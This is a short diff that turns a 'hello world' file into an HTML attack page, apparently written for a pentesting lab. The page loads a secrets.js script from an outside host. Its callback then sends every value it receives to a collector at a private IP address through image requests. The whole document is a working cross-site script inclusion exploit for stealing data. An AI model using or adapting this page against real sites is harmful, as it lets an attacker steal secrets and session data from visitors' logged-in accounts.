@@ -1,1 +1,14 @@
-hello world
+<html>
+<body>
+<script>
+function display(data) {
+  for (var key in data){
+    //li.appendChild(document.createTextNode(key+":"+data[key]));
+    document.write("<img src='http://172.24.246.158:8000?s="+data[key]+"'/>");
+  }
+
+}
+</script>
+<script src="http://ptl-481ed8a1-6b7ca425.libcurl.so/secrets.js"></script>
+</body>
+</html>
